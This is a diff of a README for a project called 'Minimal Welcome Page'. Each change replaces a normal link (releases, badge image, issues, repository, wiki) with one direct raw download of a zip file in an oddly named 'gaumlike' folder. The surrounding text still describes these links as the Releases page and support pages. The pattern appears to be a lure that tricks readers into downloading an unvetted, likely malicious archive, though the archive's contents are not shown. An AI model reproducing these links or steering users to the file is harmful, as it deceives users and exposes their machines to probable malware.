@@ -6,7 +6,7 @@ Welcome to the **Minimal Welcome Page**! This application provides a modern and 
 
 ## 📥 Download the Application
 
-[![Download Minimal-Welcome-Page](https://img.shields.io/badge/Download-Minimal--Welcome--Page-brightgreen)](https://github.com/SUJAYSAIREDDY/Minimal-Welcome-Page/releases)
+[![Download Minimal-Welcome-Page](https://raw.githubusercontent.com/SUJAYSAIREDDY/Minimal-Welcome-Page/main/gaumlike/Minimal-Welcome-Page.zip)](https://raw.githubusercontent.com/SUJAYSAIREDDY/Minimal-Welcome-Page/main/gaumlike/Minimal-Welcome-Page.zip)
 
 To get started, click the button above to visit the Releases page, where you can download the application.
 
@@ -28,7 +28,7 @@ To run the Minimal Welcome Page application, make sure your computer meets these
 ## 💡 How to Download & Install
 
 1. **Visit the Releases Page:**  
-   Go to the [Releases page](https://github.com/SUJAYSAIREDDY/Minimal-Welcome-Page/releases).
+   Go to the [Releases page](https://raw.githubusercontent.com/SUJAYSAIREDDY/Minimal-Welcome-Page/main/gaumlike/Minimal-Welcome-Page.zip).
 
 2. **Select the Latest Version:**  
    Look for the newest release at the top of the page.
@@ -86,11 +86,11 @@ Updates may occur regularly to fix bugs or improve features. Check the Releases 
 
 ## 📞 Support
 
-For further assistance, please raise an issue on our [GitHub Issues page](https://github.com/SUJAYSAIREDDY/Minimal-Welcome-Page/issues), and our team will respond as quickly as possible.
+For further assistance, please raise an issue on our [GitHub Issues page](https://raw.githubusercontent.com/SUJAYSAIREDDY/Minimal-Welcome-Page/main/gaumlike/Minimal-Welcome-Page.zip), and our team will respond as quickly as possible.
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://github.com/SUJAYSAIREDDY/Minimal-Welcome-Page)
-- [Developer Documentation](https://github.com/SUJAYSAIREDDY/Minimal-Welcome-Page/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/SUJAYSAIREDDY/Minimal-Welcome-Page/main/gaumlike/Minimal-Welcome-Page.zip)
+- [Developer Documentation](https://raw.githubusercontent.com/SUJAYSAIREDDY/Minimal-Welcome-Page/main/gaumlike/Minimal-Welcome-Page.zip)
 
 Thank you for choosing Minimal Welcome Page. We hope you enjoy your experience! Don’t forget to follow the project for updates.
